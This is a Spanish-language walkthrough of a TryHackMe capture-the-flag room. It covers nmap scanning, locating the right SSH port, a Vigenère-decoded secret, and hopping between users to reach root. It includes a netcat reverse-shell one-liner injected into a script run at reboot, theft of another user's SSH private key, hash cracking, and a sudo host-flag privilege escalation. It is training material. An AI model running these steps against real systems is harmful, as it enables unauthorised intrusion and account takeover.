Bienvenidos a otra sala de tryhackme. En esta ocasion, tendremos muchos puerto abiertos que funcionan como un espejo. Realizamos conexiones ssh a cada puerto hasta encontrar el correcto para acceder como el primer usuario. Luego, nos tendremos que mover entre usuarios dentro del sistema. Por ultimo, escalaremos privilegios obteniendo informacion que esta almacenada en el directorio sudoers.d y ser usuario raiz root.

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
sudo nmap -p- --open --min-rate=5000 -sS -Pn -sV -n -T4 -vvv IPTARGET -oN nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-10 14:28 EDT
NSE: Loaded 45 scripts for scanning.
Initiating SYN Stealth Scan at 14:28
Scanning 10.10.149.182 [65535 ports]
Discovered open port 22/tcp on IPTARGET
```

Bueno, habra una cantidad considerable de puertos . Cada uno pertenece al servicio ssh. Si intentamos establecer una conexion ssh en cada puerto, nos dejara un mensaje... upper & lower. Esto lo podemos tomar como un indicador hasta encontrar el puerto que nos dara conexion al servicio.

**Para que nos funcione el siguiente comando, tendremos que agregar "HostKeyAlgorithms +ssh-rsa" en /etc/ssh/ssh_config**

```bash
ssh IPTARGET -p 9300
Higher

ssh IPTARGET -p 9000
Lower
```

Podemos notar que los mensajes no coinicden. Asique podemos deducir que estan invertidos:
Higher = Lower
Lower = Higher

Establecemos una conexion exitosa en : 

```bash
ssh IPTARGET -p 9023
```

Los puertos son aleatorios, cada vez que iniciamos una maquina nueva el puerto va cambiando.

# Intrusion

Una vez establecida la conexion, podemos notar un texto un poco ilegible que nos pedira que pongamos un secreto. Aca no pude resolver la key que me pedia en cyberchef, asique hice un ligero research. Copiamos el texto y lo pegamos en cyberchef, luego usamos la receta vigenere decode con la palabra "THEALPHABETCIPHER", nos dirigimos a la parte inferior del texto y tenemos nuestro secreto.

Una vez puesto, obtenemos las credenciales del usuario jabberwock para establecer una conexion ssh.

```bash
ssh jabberwock@IPTARGET
```

## tweedledum

Como jabberwock, tenemos que movernos entre usuarios para luego escalar privilegios a usuario root. Para eso, listamos permisos de superusuario y sobreescribiremos el script que tiene en un directorio con nuestro codigo para atrapar una respuesta como usuario tweedledum en nuestra maquina atacante al reiniciar el sistema con sudo.

```bash
sudo -l # Listamos permisos de superusuario

ls -lah # Listamos archivos dentro del directorio

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST LPORT >/tmp/f" >> twasbrilling.sh # Agregamos nuestro codigo al script

sudo reboot # Reiniciamos sistema como sudo
```

### humptydumpty

como tweedledum, dentro de su directorio, encontramos dos textos que uno contiene un poema y el otro tiene algunos hashes.

```bash
cat humptydumpty.txt
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
```

Nos dirigimos a crackestation para crackearlos de manera automatica . 
Al darnos cuenta, podemos notar que el ultimo hash pertenece al formato HEX, al pasarlo a cyberchef automaticamente nos dice a que formato pertenece. 
Una vez encontrado las credenciales, nos logeamos como humptydumpty.

```bash
su humptydumpty
```

#### Alice

En este punto, nos daremos cuenta que podemos movernos al directorio de alice, pero no podremos realizar ninguna accion. Si conocemos la ruta donde se guarda el id_rsa, podemos realizar una lectura a ese archivo y establecer una conexion ssh a alice.

Asique, copiamos la id_rsa de alice, le daremos permisos 600 y establecemos la conexion.

```bash
cat /alice/.ssh/id_rsa # Copiamos la key 
chmod 600 id_rsa # En nuestra maquina atacante
ssh -i id_rsa alice@IPTARGET # Establecemos conexion ssh
```

# Priv.Escalation

Vamos a escalar privilegios con sudoers, yo esto no lo sabia por lo que consulte un write-up.
Se ve que se puede escalar privilegios a root utilizando el parametro -h(host) en sudo seguido de /bin/bash para ser root. 

Dentro de /etc/sudoers.d, se almacenan archivos de configuracion adicionales que se utilizan para definir reglas de permisos. En el, podemos ver los permisos de alice y si listamos los permisos, podemos ver que pertenece al usuario root.

Por lo que, utilizamos sudo e indicamos el host al que queremos acceder, que en este caso pertenece a root seguido de /bin/bash para que nos abra una sesion interactiva como root.

```bash
cd /etc/sudoers.d 
ls -lah 
-r--r-----  1 root root  958 Jan 18  2018 README
-r--r--r--  1 root root   49 Jul  3  2020 alice
-r--r-----  1 root root   57 Jul  3  2020 jabberwock
-r--r-----  1 root root  120 Jul  3  2020 tweedles


cat alice 
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash

sudo -h ssalg-gnikool /bin/bash
```


